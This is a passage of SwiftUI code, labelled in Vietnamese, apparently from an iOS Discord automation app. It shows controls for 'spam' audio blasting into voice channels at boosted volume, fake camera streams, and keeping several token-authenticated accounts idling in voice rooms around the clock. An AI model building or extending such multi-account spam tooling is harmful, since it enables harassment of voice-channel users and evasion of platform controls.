                                            .fill(isCurrent ? Color.red.opacity(0.18) : Color(UIColor.secondarySystemGroupedBackground))
                                            .frame(width: 34, height: 34)
                                        if isCurrent && musicStream.isPlaying {
                                            Image(systemName: "waveform")
                                                .font(.system(size: 13, weight: .bold))
                                                .foregroundColor(.red)
                                        } else {
                                            Text("#\(index + 1)")
                                                .font(.system(size: 11, weight: .bold, design: .monospaced))
                                                .foregroundColor(isCurrent ? .red : .secondary)
                                        }
                                    }

                                    VStack(alignment: .leading, spacing: 2) {
                                        Text(item.title)
                                            .font(.system(size: 14, weight: .semibold))
                                            .foregroundColor(isCurrent ? .red : .primary)
                                            .lineLimit(1)
                                        HStack(spacing: 6) {
                                            if item.isPreset {
                                                microBadge("VIP", bg: Color.orange.opacity(0.18), fg: .orange)
                                            }
                                            Text(item.durationFormatted)
                                                .font(.system(size: 11, design: .monospaced))
                                                .foregroundStyle(.secondary)
                                        }
                                    }

                                    Spacer()

                                    Button {
                                        musicStream.removeTrack(id: item.id)
                                    } label: {
                                        Image(systemName: "trash")
                                            .font(.caption)
                                            .foregroundStyle(.secondary)
                                            .padding(7)
                                            .background(Color(UIColor.secondarySystemGroupedBackground))
                                            .clipShape(Circle())
                                    }
                                }
                                .padding(9)
                                .background(isCurrent ? Color.red.opacity(0.09) : Color(UIColor.tertiarySystemGroupedBackground))
                                .clipShape(RoundedRectangle(cornerRadius: 13, style: .continuous))
                                .overlay(
                                    RoundedRectangle(cornerRadius: 13, style: .continuous)
                                        .stroke(isCurrent ? Color.red.opacity(0.35) : Color.clear, lineWidth: 1)
                                )
                            }
                            .buttonStyle(.plain)
                        }
                    }
                }
                .frame(maxHeight: 220)
            }
        }
    }

    // Card 4: Bộ Xử Lý DSP & Sát Chiêu Âm Thanh
    private var combatEffectsCard: some View {
        studioCard {
            HStack(spacing: 10) {
                iconSquircle(systemName: "slider.horizontal.3", colors: [Color.orange, Color.red])
                VStack(alignment: .leading, spacing: 1) {
                    Text("Bộ Xử Lý Âm Thanh & DSP")
                        .font(.system(size: 16, weight: .bold, design: .rounded))
                    Text("Tinh chỉnh trực tiếp theo thời gian thực")
                        .font(.caption)
                        .foregroundStyle(.secondary)
                }
                Spacer()
            }

            HStack(spacing: 10) {
                tactileFeatureTile(
                    title: "MAX GAIN V9",
                    subtitle: "EQ + 2.5x Boost",
                    icon: "bolt.fill",
                    isOn: musicStream.isMaxMode,
                    activeColor: .red
                ) {
                    withAnimation(.easeInOut(duration: 0.2)) {
                        musicStream.isMaxMode.toggle()
                    }
                }

                tactileFeatureTile(
                    title: "LỌC ỒN DSP",
                    subtitle: "150Hz – 10kHz",
                    icon: "sparkles",
                    isOn: musicStream.isCleanMode,
                    activeColor: .teal
                ) {
                    withAnimation(.easeInOut(duration: 0.2)) {
                        musicStream.isCleanMode.toggle()
                    }
                }
            }

            // Horizontal Scrollable Audio FX Chips (không bao giờ bị cắt chữ)
            VStack(alignment: .leading, spacing: 8) {
                Text("Hiệu ứng âm thanh")
                    .font(.caption.bold())
                    .foregroundStyle(.secondary)

                ScrollView(.horizontal, showsIndicators: false) {
                    HStack(spacing: 8) {
                        ForEach(SpamAudioFX.allCases) { fx in
                            let selected = (musicStream.audioFX == fx)
                            Button {
                                withAnimation(.easeInOut(duration: 0.2)) {
                                    musicStream.audioFX = fx
                                }
                            } label: {
                                HStack(spacing: 5) {
                                    Image(systemName: fxSymbol(for: fx))
                                        .font(.system(size: 11, weight: .bold))
                                    Text(fx.rawValue)
                                        .font(.system(size: 12, weight: .bold, design: .rounded))
                                }
                                .padding(.horizontal, 13)
                                .padding(.vertical, 8)
                                .background(
                                    Group {
                                        if selected {
                                            LinearGradient(colors: [.red, .orange], startPoint: .leading, endPoint: .trailing)
                                        } else {
                                            Color(UIColor.tertiarySystemGroupedBackground)
                                        }
                                    }
                                )
                                .foregroundColor(selected ? .white : .primary)
                                .clipShape(Capsule())
                            }
                            .buttonStyle(.plain)
                        }
                    }
                }
            }

            // Volume Slider
            VStack(alignment: .leading, spacing: 6) {
                HStack {
                    Label("Âm lượng (Volume)", systemImage: "speaker.wave.2.fill")
                        .font(.subheadline.weight(.semibold))
                    Spacer()
                    Text("\(Int(musicStream.volume * 100))%")
                        .font(.system(size: 14, weight: .heavy, design: .monospaced))
                        .foregroundColor(.red)
                }
                Slider(value: $musicStream.volume, in: 0.0...2.0, step: 0.05).tint(.red)
                HStack(spacing: 6) {
                    ForEach([0.5, 1.0, 1.5, 2.0], id: \.self) { v in
                        presetChip(
                            label: v == 2.0 ? "200% MAX" : "\(Int(v * 100))%",
                            isSelected: musicStream.volume == Float(v),
                            color: .red
                        ) { musicStream.volume = Float(v) }
                    }
                }
            }
            .padding(12)
            .background(Color(UIColor.tertiarySystemGroupedBackground))
            .clipShape(RoundedRectangle(cornerRadius: 14, style: .continuous))

            // Boost Slider
            VStack(alignment: .leading, spacing: 6) {
                HStack {
                    Label("Ép xung khuếch đại (Boost)", systemImage: "bolt.circle.fill")
                        .font(.subheadline.weight(.semibold))
                    Spacer()
                    Text("\(Int(musicStream.boostMultiplier * 100))%")
                        .font(.system(size: 14, weight: .heavy, design: .monospaced))
                        .foregroundColor(.orange)
                }
                Slider(value: $musicStream.boostMultiplier, in: 1.0...5.0, step: 0.25).tint(.orange)
                HStack(spacing: 6) {
                    ForEach([1.0, 2.0, 3.0, 5.0], id: \.self) { b in
                        presetChip(
                            label: b == 5.0 ? "500% MAX" : "\(Int(b * 100))%",
                            isSelected: musicStream.boostMultiplier == Float(b),
                            color: .orange
                        ) { musicStream.boostMultiplier = Float(b) }
                    }
                }
            }
            .padding(12)
            .background(Color(UIColor.tertiarySystemGroupedBackground))
            .clipShape(RoundedRectangle(cornerRadius: 14, style: .continuous))

            // Bass Slider
            VStack(alignment: .leading, spacing: 6) {
                HStack {
                    Label("Tăng cường âm trầm (Bass)", systemImage: "waveform")
                        .font(.subheadline.weight(.semibold))
                    Spacer()
                    Text("+\(Int(musicStream.bassAmount))")
                        .font(.system(size: 14, weight: .heavy, design: .monospaced))
                        .foregroundColor(.purple)
                }
                Slider(value: $musicStream.bassAmount, in: 0...100, step: 5).tint(.purple)
                HStack(spacing: 6) {
                    ForEach([0, 25, 50, 100], id: \.self) { b in
                        presetChip(
                            label: b == 0 ? "Gốc" : "+\(b)",
                            isSelected: musicStream.bassAmount == Float(b),
                            color: .purple
                        ) { musicStream.bassAmount = Float(b) }
                    }
                }
            }
            .padding(12)
            .background(Color(UIColor.tertiarySystemGroupedBackground))
            .clipShape(RoundedRectangle(cornerRadius: 14, style: .continuous))

            // Local Monitor Row
            HStack(spacing: 12) {
                Image(systemName: "headphones")
                    .font(.system(size: 16, weight: .semibold))
                    .foregroundColor(.red)
                    .frame(width: 32, height: 32)
                    .background(Color.red.opacity(0.12))
                    .clipShape(Circle())

                VStack(alignment: .leading, spacing: 2) {
                    Text("Nghe loa ngoài (Monitor)")
                        .font(.subheadline.weight(.semibold))
                    Text("Mặc định TẮT để phát thẳng vào Discord Voice.")
                        .font(.caption2)
                        .foregroundStyle(.secondary)
                }
                Spacer()
                Toggle("", isOn: $musicStream.playLocalSpeaker)
                    .labelsHidden()
                    .tint(.red)
            }
            .padding(12)
            .background(Color(UIColor.tertiarySystemGroupedBackground))
            .clipShape(RoundedRectangle(cornerRadius: 14, style: .continuous))
        }
    }

    // Card 5: Primary CTA Button (Xả Nhạc)
    private var mainActionCard: some View {
        Group {
            if musicStream.isPlaying {
                Button {
                    musicStream.stopSpam()
                } label: {
                    HStack(spacing: 10) {
                        Image(systemName: "stop.circle.fill")
                            .font(.system(size: 20, weight: .bold))
                        Text("DỪNG XẢ NHẠC & THU HỒI PHÂN THÂN")
                            .font(.system(size: 15, weight: .heavy, design: .rounded))
                    }
                    .foregroundColor(.white)
                    .frame(maxWidth: .infinity)
                    .padding(.vertical, 16)
                    .background(LinearGradient(colors: [Color(red: 0.90, green: 0.16, blue: 0.22), Color(red: 0.72, green: 0.10, blue: 0.16)], startPoint: .leading, endPoint: .trailing))
                    .clipShape(RoundedRectangle(cornerRadius: 16, style: .continuous))
                    .shadow(color: Color.red.opacity(0.35), radius: 10, y: 5)
                }
            } else {
                let canStart = (musicStream.currentDecoder != nil)
                Button {
                    musicStream.startSpam(app: app)
                } label: {
                    HStack(spacing: 10) {
                        Image(systemName: "flame.fill")
                            .font(.system(size: 18, weight: .bold))
                        Text("XUẤT THỦ XẢ NHẠC BẤT TỬ")
                            .font(.system(size: 15, weight: .heavy, design: .rounded))
                    }
                    .foregroundColor(.white)
                    .frame(maxWidth: .infinity)
                    .padding(.vertical, 16)
                    .background(
                        canStart
                        ? LinearGradient(colors: [Color(red: 0.95, green: 0.22, blue: 0.26), Color(red: 1.0, green: 0.48, blue: 0.14)], startPoint: .leading, endPoint: .trailing)
                        : LinearGradient(colors: [Color.gray.opacity(0.6), Color.gray.opacity(0.5)], startPoint: .leading, endPoint: .trailing)
                    )
                    .clipShape(RoundedRectangle(cornerRadius: 16, style: .continuous))
                    .shadow(color: canStart ? Color.red.opacity(0.38) : .clear, radius: 12, y: 6)
                }
                .disabled(!canStart)
            }
        }
    }

    // Card 6: Nhật Ký Xuất Thủ
    private var battleLogsCard: some View {
        Group {
            if !musicStream.logs.isEmpty {
                studioTerminalCard(
                    title: "Nhật Ký Xả Nhạc",
                    accent: .red,
                    logs: musicStream.logs,
                    copied: $copiedMusicLog,
                    onClear: { musicStream.logs.removeAll() }
                )
            }
        }
    }

    // ==========================================================================
    // MARK: - TAB 2: TREO ROOM 24/7 (MODERN STUDIO CONTROL DECK)
    // ==========================================================================
    private var treoRoomSection: some View {
        VStack(spacing: 16) {
            treoHeroCard
            treoChannelCard
            treoConfigCard
            treoGoLiveCard
            treoFakeCamCard
            treoActionButton
            treoSessionsCard
            treoLogsCard
        }
    }

    // Card 1: Hero Live Telemetry Dashboard
    private var treoHeroCard: some View {
        let joinedCount = voiceRoom.sessions.filter { $0.isJoined }.count
        let totalCount = voiceRoom.sessions.count

        return studioCard(
            borderColor: voiceRoom.isRunning ? Color.green.opacity(0.38) : Color.indigo.opacity(0.18),
            borderWidth: voiceRoom.isRunning ? 1.5 : 1
        ) {
            HStack(spacing: 10) {
                ZStack {
                    if voiceRoom.isRunning {
                        Circle()
                            .fill(Color.green.opacity(0.28))
                            .frame(width: 22, height: 22)
                            .scaleEffect(pulseLive ? 1.3 : 0.8)
                            .animation(.easeInOut(duration: 1.0).repeatForever(autoreverses: true), value: pulseLive)
                    }
                    Circle()
                        .fill(voiceRoom.isRunning ? Color.green : Color.indigo.opacity(0.6))
                        .frame(width: 10, height: 10)
                }

                VStack(alignment: .leading, spacing: 2) {
                    Text(voiceRoom.isRunning ? "ĐANG TREO PHÒNG 24/7" : "Sẵn Sàng Treo Room")
                        .font(.system(size: 15, weight: .heavy, design: .rounded))
                        .foregroundColor(voiceRoom.isRunning ? .green : .primary)
                    Text(voiceRoom.isRunning
                         ? "Thoát app hoặc khóa màn hình vẫn giữ kết nối & stream"
                         : "Hỗ trợ Go Live + Fake Cam song song • WebRTC DTLS-SRTP")
                        .font(.caption2)
                        .foregroundStyle(.secondary)
                        .lineLimit(1)
                }

                Spacer()

                if voiceRoom.isRunning {
                    HStack(spacing: 4) {
                        if voiceRoom.isStreamEnabled {
                            microBadge("LIVE", bg: .red)
                        }
                        if voiceRoom.isCamEnabled {
                            microBadge("CAM", bg: .purple)
                        }
                    }
                }
            }

            if voiceRoom.isRunning {
                HStack(spacing: 10) {
                    VStack(alignment: .leading, spacing: 4) {
                        Text("TRONG PHÒNG")
                            .font(.system(size: 10, weight: .bold))
                            .foregroundStyle(.secondary)
                        Text("\(joinedCount) / \(totalCount)")
                            .font(.system(size: 22, weight: .black, design: .rounded))
                            .foregroundColor(.green)
                            .monospacedDigit()
                    }
                    .frame(maxWidth: .infinity, alignment: .leading)
                    .padding(12)
                    .background(Color.green.opacity(0.10))
                    .clipShape(RoundedRectangle(cornerRadius: 14, style: .continuous))

                    VStack(alignment: .leading, spacing: 4) {
                        Text("THỜI GIAN TREO")
                            .font(.system(size: 10, weight: .bold))
                            .foregroundStyle(.secondary)
                        Text(voiceRoom.formatDuration(voiceRoom.elapsedSeconds))
                            .font(.system(size: 22, weight: .black, design: .monospaced))
                            .foregroundColor(.indigo)
                            .monospacedDigit()
                    }
                    .frame(maxWidth: .infinity, alignment: .leading)
                    .padding(12)
                    .background(Color.indigo.opacity(0.10))
                    .clipShape(RoundedRectangle(cornerRadius: 14, style: .continuous))
                }
            } else {
                HStack(spacing: 8) {
                    microBadge("\(activeTokens.count) TOKEN", bg: Color.indigo.opacity(0.14), fg: .indigo)
                    microBadge(voiceRoom.activeProfile.label, bg: Color.purple.opacity(0.14), fg: .purple)
                    Spacer()
                    HStack(spacing: 4) {
                        Image(systemName: "moon.stars.fill")
                            .font(.caption2)
                        Text("Chạy nền 24/7")
                            .font(.caption2.bold())
                    }
                    .foregroundColor(.teal)
                }
            }
        }
    }

    // Card 2: Máy Chủ & Kênh Thoại
    private var treoChannelCard: some View {
        studioCard {
            HStack(spacing: 10) {
                iconSquircle(systemName: "antenna.radiowaves.left.and.right", colors: [Color.indigo, Color.blue])
                VStack(alignment: .leading, spacing: 1) {
                    Text("Máy Chủ & Kênh Thoại")
                        .font(.system(size: 16, weight: .bold, design: .rounded))
                    Text("Dán Channel ID hoặc chọn trực tiếp từ Server")
                        .font(.caption)
                        .foregroundStyle(.secondary)
                }
                Spacer()
                Button {
                    showGuildPicker = true
                } label: {
                    Text(voiceRoom.selectedGuild == nil ? "Chọn Kênh" : "Đổi Kênh")
                        .font(.caption.bold())
                        .foregroundColor(.white)
                        .padding(.horizontal, 12)
                        .padding(.vertical, 7)
                        .background(LinearGradient(colors: [.indigo, .purple], startPoint: .leading, endPoint: .trailing))
                        .clipShape(Capsule())
                }
            }

            HStack(spacing: 8) {
                Image(systemName: "number")
                    .font(.caption.bold())
                    .foregroundStyle(.secondary)
                TextField("Dán Channel ID treo...", text: $voiceRoom.targetChannelId)
                    .textFieldStyle(.plain)
                    .font(.system(size: 14, design: .monospaced))
                    .keyboardType(.numberPad)
                if !voiceRoom.targetChannelId.isEmpty {
                    Button {
                        voiceRoom.targetChannelId = ""
                    } label: {
                        Image(systemName: "xmark.circle.fill")
                            .font(.caption)
                            .foregroundStyle(.secondary)
                    }
                }
            }
            .padding(.horizontal, 12)
            .padding(.vertical, 11)
            .background(Color(UIColor.tertiarySystemGroupedBackground))
            .clipShape(RoundedRectangle(cornerRadius: 12, style: .continuous))

            if let g = voiceRoom.selectedGuild, let c = voiceRoom.selectedChannel {
                HStack(spacing: 6) {
                    Image(systemName: "checkmark.circle.fill")
                        .foregroundColor(.green)
                        .font(.caption)
                    Text("\(g.name)  ›  \(c.displayName)")
                        .font(.caption.bold())
                        .foregroundColor(.green)
                        .lineLimit(1)
                    Spacer()
                }
                .padding(.horizontal, 10)
                .padding(.vertical, 8)
                .background(Color.green.opacity(0.12))
                .clipShape(RoundedRectangle(cornerRadius: 10, style: .continuous))
            }
        }
    }

    // Card 3: Cấu Hình Phòng & Chất Lượng Video
    private var treoConfigCard: some View {
        studioCard {
            HStack(spacing: 10) {
                iconSquircle(systemName: "slider.horizontal.3", colors: [Color.indigo, Color.purple])
                VStack(alignment: .leading, spacing: 1) {
                    Text("Cấu Hình Phòng & Chất Lượng")
                        .font(.system(size: 16, weight: .bold, design: .rounded))
                    Text(voiceRoom.activeProfile.label)
                        .font(.caption.bold())
                        .foregroundColor(.indigo)
                }
                Spacer()
            }

            HStack(spacing: 8) {
                tactileOptionPill(
                    title: "Treo Cả Dàn (\(activeTokens.count))",
                    icon: "person.3.fill",
                    isSelected: voiceRoom.multiTokenMode,
                    accent: .indigo
                ) {
                    withAnimation(.easeInOut(duration: 0.2)) { voiceRoom.multiTokenMode = true }
                }

                tactileOptionPill(
                    title: "1 Token Chính",
                    icon: "person.fill",
                    isSelected: !voiceRoom.multiTokenMode,
                    accent: .indigo
                ) {
                    withAnimation(.easeInOut(duration: 0.2)) { voiceRoom.multiTokenMode = false }
                }
            }

            if !voiceRoom.multiTokenMode, let mainTok = singleTokenList.first {
                HStack(spacing: 6) {
                    Image(systemName: "person.crop.circle.fill")
                        .foregroundColor(.indigo)
                        .font(.caption)
                    Text("Token chính: \(mainTok.username)")
                        .font(.caption.bold())
                        .foregroundStyle(.secondary)
                    Spacer()
                }
                .padding(.horizontal, 10)
                .padding(.vertical, 6)
                .background(Color(UIColor.tertiarySystemGroupedBackground))
                .clipShape(RoundedRectangle(cornerRadius: 9, style: .continuous))
            }

            HStack(spacing: 10) {
                tactileFeatureTile(
                    title: "Tắt Mic",
                    subtitle: voiceRoom.selfMute ? "Đang tắt tiếng" : "Mic đang mở",
                    icon: voiceRoom.selfMute ? "mic.slash.fill" : "mic.fill",
                    isOn: voiceRoom.selfMute,
                    activeColor: .red
                ) {
                    voiceRoom.updateToggles(mute: !voiceRoom.selfMute, deaf: voiceRoom.selfDeaf, video: voiceRoom.selfVideo)
                }

                tactileFeatureTile(
                    title: "Điếc Tai",
                    subtitle: voiceRoom.selfDeaf ? "Đang tắt nghe" : "Đang nghe phòng",
                    icon: voiceRoom.selfDeaf ? "speaker.slash.fill" : "headphones",
                    isOn: voiceRoom.selfDeaf,
                    activeColor: .indigo
                ) {
                    voiceRoom.updateToggles(mute: voiceRoom.selfMute, deaf: !voiceRoom.selfDeaf, video: voiceRoom.selfVideo)
                }
            }

            VStack(alignment: .leading, spacing: 8) {
                HStack {
                    Text("Chất lượng Video / Stream")
                        .font(.caption.bold())
                        .foregroundStyle(.secondary)
                    Spacer()
                    Text(voiceRoom.activeProfile.label)
                        .font(.caption2.bold())
                        .foregroundColor(.purple)
                }

                HStack(spacing: 6) {
                    ForEach(TreoVideoQualityMode.allCases) { q in
                        let selected = (voiceRoom.videoQualityMode == q)
                        Button {
                            withAnimation(.easeInOut(duration: 0.2)) {
                                voiceRoom.updateQualityMode(q)
                            }
                        } label: {
                            Text(shortQualityTitle(q))
                                .font(.system(size: 12, weight: .bold, design: .rounded))
                                .lineLimit(1)
                                .minimumScaleFactor(0.85)
                                .frame(maxWidth: .infinity)
                                .padding(.vertical, 9)
                                .background(
                                    Group {
                                        if selected {
                                            LinearGradient(colors: [.indigo, .purple], startPoint: .leading, endPoint: .trailing)
                                        } else {
                                            Color(UIColor.tertiarySystemGroupedBackground)
                                        }
                                    }
                                )
                                .foregroundColor(selected ? .white : .primary)
                                .clipShape(RoundedRectangle(cornerRadius: 11, style: .continuous))
                        }
                        .buttonStyle(.plain)
                    }
                }
            }
        }
    }

    // Card 4: Go Live Stream Studio Deck
    private var treoGoLiveCard: some View {
        let isLiveActive = voiceRoom.isRunning && voiceRoom.isStreamEnabled
        return studioCard(
            borderColor: isLiveActive ? Color.red.opacity(0.45) : (voiceRoom.isStreamEnabled ? Color.red.opacity(0.22) : Color.primary.opacity(0.07)),
            borderWidth: isLiveActive ? 1.5 : 1
        ) {
            HStack(spacing: 11) {
                iconSquircle(systemName: "play.tv.fill", colors: [Color(red: 0.95, green: 0.20, blue: 0.30), Color.orange], size: 38)
                VStack(alignment: .leading, spacing: 2) {
                    HStack(spacing: 6) {
                        Text("Go Live Stream")
                            .font(.system(size: 16, weight: .bold, design: .rounded))
                        microBadge(isLiveActive ? "● ĐANG LIVE" : "LOOP ∞", bg: isLiveActive ? .red : Color.red.opacity(0.14), fg: isLiveActive ? .white : .red)
                    }
                    Text("Video .mp4/.mov (0% GPU nền) hoặc .mp3")
                        .font(.caption2)
                        .foregroundStyle(.secondary)
                        .lineLimit(1)
                }
                Spacer()
                Toggle("", isOn: Binding(
                    get: { voiceRoom.isStreamEnabled },
                    set: { voiceRoom.setStreamEnabled($0) }
                ))
                .labelsHidden()
                .tint(.red)
            }

            if let media = voiceRoom.streamMedia {
                VStack(alignment: .leading, spacing: 8) {
                    HStack(spacing: 10) {
                        Image(systemName: media.isAudioOnly ? "music.note" : "film.fill")
                            .font(.system(size: 14, weight: .bold))
                            .foregroundColor(.red)
                            .frame(width: 30, height: 30)
                            .background(Color.red.opacity(0.14))
                            .clipShape(RoundedRectangle(cornerRadius: 8, style: .continuous))

                        VStack(alignment: .leading, spacing: 1) {
                            Text(media.title)
                                .font(.caption.bold())
                                .lineLimit(1)
                            Text(media.isAudioOnly ? "Chế độ Nhạc + Màn hình đen" : "Full Video Loop ∞ • Chạy nền 0% GPU")
                                .font(.system(size: 10))
                                .foregroundStyle(.secondary)
                        }

                        Spacer()

                        Button {
                            voiceRoom.clearStreamMedia()
                        } label: {
                            Image(systemName: "xmark.circle.fill")
                                .font(.system(size: 18))
                                .foregroundStyle(.secondary)
                        }
                    }

                    cacheReadinessView(status: voiceRoom.streamCacheStatus, accent: .red)
                }
                .padding(10)
                .background(Color(UIColor.tertiarySystemGroupedBackground))
                .clipShape(RoundedRectangle(cornerRadius: 12, style: .continuous))
            } else {
                Text("Chưa chọn file Stream — bật nút để phát mẫu ảo hoặc chọn file bên dưới.")
                    .font(.caption)
                    .foregroundStyle(.secondary)
                    .padding(.vertical, 2)
            }

            HStack(spacing: 8) {
                Button {
                    showStreamMediaPicker = true
                } label: {
                    HStack(spacing: 5) {
                        Image(systemName: "folder.badge.plus")
                        Text("Chọn Video / MP3")
                    }
                    .font(.caption.bold())
                    .frame(maxWidth: .infinity)
                    .padding(.vertical, 9)
                    .background(Color.red.opacity(0.14))
                    .foregroundColor(.red)
                    .clipShape(RoundedRectangle(cornerRadius: 11, style: .continuous))
                }

                Button {
                    voiceRoom.selectVirtualMedia(.virtualCamPattern, forStream: true)
                } label: {
                    Text("🌈 Mẫu Ảo")
                        .font(.caption.bold())
                        .padding(.horizontal, 11)
                        .padding(.vertical, 9)
                        .background(Color(UIColor.tertiarySystemGroupedBackground))
                        .foregroundColor(.primary)
                        .clipShape(RoundedRectangle(cornerRadius: 11, style: .continuous))
                }

                Button {
                    voiceRoom.selectVirtualMedia(.virtualBlackScreen, forStream: true)
                } label: {
                    Text("⬛ Đen")
                        .font(.caption.bold())
                        .padding(.horizontal, 11)
                        .padding(.vertical, 9)
                        .background(Color(UIColor.tertiarySystemGroupedBackground))
                        .foregroundColor(.primary)
                        .clipShape(RoundedRectangle(cornerRadius: 11, style: .continuous))
                }
            }
        }
    }

    // Card 5: Fake Cam Studio Deck
    private var treoFakeCamCard: some View {
        let isCamActive = voiceRoom.isRunning && voiceRoom.isCamEnabled
        return studioCard(
            borderColor: isCamActive ? Color.purple.opacity(0.45) : (voiceRoom.isCamEnabled ? Color.purple.opacity(0.22) : Color.primary.opacity(0.07)),
            borderWidth: isCamActive ? 1.5 : 1
        ) {
            HStack(spacing: 11) {
                iconSquircle(systemName: "video.fill", colors: [Color.purple, Color.pink], size: 38)
                VStack(alignment: .leading, spacing: 2) {
                    HStack(spacing: 6) {
                        Text("Fake Cam")
                            .font(.system(size: 16, weight: .bold, design: .rounded))
                        microBadge(isCamActive ? "● CAM ON" : "SONG SONG", bg: isCamActive ? .purple : Color.purple.opacity(0.14), fg: isCamActive ? .white : .purple)
                    }
                    Text("Camera ảo phát hình song song với Go Live")
                        .font(.caption2)
                        .foregroundStyle(.secondary)
                        .lineLimit(1)
                }
                Spacer()
                Toggle("", isOn: Binding(
                    get: { voiceRoom.isCamEnabled },
                    set: { voiceRoom.setCamEnabled($0) }
                ))
                .labelsHidden()
                .tint(.purple)
            }

            if let media = voiceRoom.camMedia {
                VStack(alignment: .leading, spacing: 8) {
                    HStack(spacing: 10) {
                        Image(systemName: "camera.fill")
                            .font(.system(size: 14, weight: .bold))
                            .foregroundColor(.purple)
                            .frame(width: 30, height: 30)
                            .background(Color.purple.opacity(0.14))
                            .clipShape(RoundedRectangle(cornerRadius: 8, style: .continuous))

                        VStack(alignment: .leading, spacing: 1) {
                            Text(media.title)
                                .font(.caption.bold())
                                .lineLimit(1)
                            Text("Camera Ảo Full Video Loop ∞ • Chạy nền 0% GPU")
                                .font(.system(size: 10))
                                .foregroundStyle(.secondary)
                        }

                        Spacer()

                        Button {
                            voiceRoom.clearCamMedia()
                        } label: {
                            Image(systemName: "xmark.circle.fill")
                                .font(.system(size: 18))
                                .foregroundStyle(.secondary)
                        }
                    }

                    cacheReadinessView(status: voiceRoom.camCacheStatus, accent: .purple)
                }
                .padding(10)
                .background(Color(UIColor.tertiarySystemGroupedBackground))
                .clipShape(RoundedRectangle(cornerRadius: 12, style: .continuous))
            } else {
                Text("Chưa chọn file Fake Cam — có thể bật song song với Go Live Stream.")
                    .font(.caption)
                    .foregroundStyle(.secondary)
                    .padding(.vertical, 2)
            }

            HStack(spacing: 8) {
                Button {
                    showCamMediaPicker = true
                } label: {
                    HStack(spacing: 5) {
                        Image(systemName: "folder.badge.plus")
                        Text("Chọn Video Cam")
                    }
                    .font(.caption.bold())
                    .frame(maxWidth: .infinity)
                    .padding(.vertical, 9)
                    .background(Color.purple.opacity(0.14))
                    .foregroundColor(.purple)
                    .clipShape(RoundedRectangle(cornerRadius: 11, style: .continuous))
                }

                Button {
                    voiceRoom.selectVirtualMedia(.virtualCamPattern, forStream: false)
                } label: {
                    Text("🌈 Mẫu Ảo")
                        .font(.caption.bold())
                        .padding(.horizontal, 11)
                        .padding(.vertical, 9)
                        .background(Color(UIColor.tertiarySystemGroupedBackground))
                        .foregroundColor(.primary)
                        .clipShape(RoundedRectangle(cornerRadius: 11, style: .continuous))
                }

                Button {
                    voiceRoom.selectVirtualMedia(.virtualBlackScreen, forStream: false)
                } label: {
                    Text("⬛ Đen")
                        .font(.caption.bold())
                        .padding(.horizontal, 11)
                        .padding(.vertical, 9)
                        .background(Color(UIColor.tertiarySystemGroupedBackground))
                        .foregroundColor(.primary)
                        .clipShape(RoundedRectangle(cornerRadius: 11, style: .continuous))
                }
            }
        }
    }

    // Card 6: Primary Action CTA Button (Treo Room)
    private var treoActionButton: some View {
        Group {
            if voiceRoom.isRunning {
                Button {
                    voiceRoom.stopTreo()
                } label: {
                    HStack(spacing: 10) {
                        Image(systemName: "stop.circle.fill")
                            .font(.system(size: 20, weight: .bold))
                        Text("RỜI PHÒNG / DỪNG TREO")
                            .font(.system(size: 15, weight: .heavy, design: .rounded))
                    }
                    .foregroundColor(.white)
                    .frame(maxWidth: .infinity)
                    .padding(.vertical, 16)
                    .background(LinearGradient(colors: [Color(red: 0.90, green: 0.16, blue: 0.22), Color(red: 0.72, green: 0.10, blue: 0.16)], startPoint: .leading, endPoint: .trailing))
                    .clipShape(RoundedRectangle(cornerRadius: 16, style: .continuous))
                    .shadow(color: Color.red.opacity(0.35), radius: 10, y: 5)
                }
            } else {
                let canStart = (!voiceRoom.targetChannelId.isEmpty || voiceRoom.selectedChannel != nil) && !activeTokens.isEmpty
                Button {
                    let channelId = !voiceRoom.targetChannelId.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty
                        ? voiceRoom.targetChannelId.trimmingCharacters(in: .whitespacesAndNewlines)
                        : (voiceRoom.selectedChannel?.id ?? "")
                    guard !channelId.isEmpty else { return }

                    let tokensToUse = voiceRoom.multiTokenMode ? activeTokens : singleTokenList
                    guard !tokensToUse.isEmpty else { return }

                    Task {
                        guard await LicenseManager.shared.authorizeFeature(.voice) else { return }
                        var gid = voiceRoom.selectedGuild?.id
                        if gid == nil, let tok = tokensToUse.first?.token {
                            gid = await fetchGuildIdForChannel(token: tok, channelId: channelId, scope: .voice)
                        }
                        guard let finalGid = gid else { return }
                        let cName = voiceRoom.selectedChannel?.displayName ?? channelId
                        voiceRoom.startTreo(guildId: finalGid, channelId: channelId, channelName: cName, tokens: tokensToUse)
                    }
                } label: {
                    HStack(spacing: 10) {
                        Image(systemName: "play.fill")
                            .font(.system(size: 17, weight: .bold))
                        Text("BẮT ĐẦU TREO ROOM 24/7")
                            .font(.system(size: 15, weight: .heavy, design: .rounded))
                    }
                    .foregroundColor(.white)
                    .frame(maxWidth: .infinity)
                    .padding(.vertical, 16)
                    .background(
                        canStart
                        ? LinearGradient(colors: [Color(red: 0.36, green: 0.34, blue: 0.96), Color(red: 0.62, green: 0.28, blue: 0.95)], startPoint: .leading, endPoint: .trailing)
                        : LinearGradient(colors: [Color.gray.opacity(0.6), Color.gray.opacity(0.5)], startPoint: .leading, endPoint: .trailing)
                    )
                    .clipShape(RoundedRectangle(cornerRadius: 16, style: .continuous))
                    .shadow(color: canStart ? Color.indigo.opacity(0.38) : .clear, radius: 12, y: 6)
                }
                .disabled(!canStart)
            }
        }
    }

    // Card 7: Tài Khoản Trong Voice
    private var treoSessionsCard: some View {
        Group {
            if !voiceRoom.sessions.isEmpty {
                studioCard {
                    HStack(spacing: 10) {
                        iconSquircle(systemName: "person.2.fill", colors: [Color.indigo, Color.cyan], size: 30)
                        Text("Tài Khoản Trong Voice")
                            .font(.system(size: 15, weight: .bold, design: .rounded))
                        Spacer()
                        microBadge("\(voiceRoom.sessions.filter { $0.isJoined }.count)/\(voiceRoom.sessions.count) ONLINE", bg: Color.green.opacity(0.14), fg: .green)
                    }

                    VStack(spacing: 8) {
                        ForEach(voiceRoom.sessions) { s in
                            let dotColor: Color = s.isVoiceUDPReady ? .green : (s.isJoined ? .green.opacity(0.7) : (s.isConnected ? .orange : .red))
                            HStack(spacing: 10) {
                                ZStack(alignment: .bottomTrailing) {
                                    if let url = s.avatarURL {
                                        AsyncImage(url: url) { img in img.resizable().scaledToFill() }
                                        placeholder: { Circle().fill(.gray.opacity(0.3)) }
                                        .frame(width: 36, height: 36)
                                        .clipShape(Circle())
                                    } else {
                                        Circle()
                                            .fill(Color.indigo.opacity(0.2))
                                            .frame(width: 36, height: 36)
                                            .overlay(
                                                Text(String(s.username.prefix(1)).uppercased())
                                                    .font(.caption.bold())
